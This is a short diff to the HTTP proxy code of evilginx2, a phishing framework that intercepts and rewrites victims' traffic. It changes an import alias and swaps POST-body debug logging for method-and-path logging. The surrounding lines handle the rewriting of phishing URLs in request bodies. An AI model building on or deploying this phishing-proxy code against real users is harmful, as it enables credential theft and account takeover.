@@ -20,6 +20,7 @@ import (
 	"html"
 	"io"
 	"io/ioutil"
+
 	"net"
 	"net/http"
 	"net/url"
@@ -41,7 +42,8 @@ import (
 	http_dialer "github.com/mwitkow/go-http-dialer"
 
 	"github.com/kgretzky/evilginx2/database"
-	"github.com/kgretzky/evilginx2/log"
+
+	log "github.com/kgretzky/evilginx2/log"
 )
 
 const (
@@ -664,10 +666,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						// patch phishing URLs in JSON body with original domains
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
 						req.ContentLength = int64(len(body))
-
-						log.Debug("POST: %s", req.URL.Path)
-						log.Debug("POST body = %s", body)
-
+						log.Debug("%s: %s", req.Method, req.URL.Path)
 						contentType := req.Header.Get("Content-type")
 
 						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
@@ -752,7 +751,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						} else if form_re.MatchString(contentType) {
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
-								log.Debug("POST: %s", req.URL.Path)
+								log.Debug("%s: %s", req.Method, req.URL.Path)
 
 								for k, v := range req.PostForm {
 									// patch phishing URLs in POST params with original domains
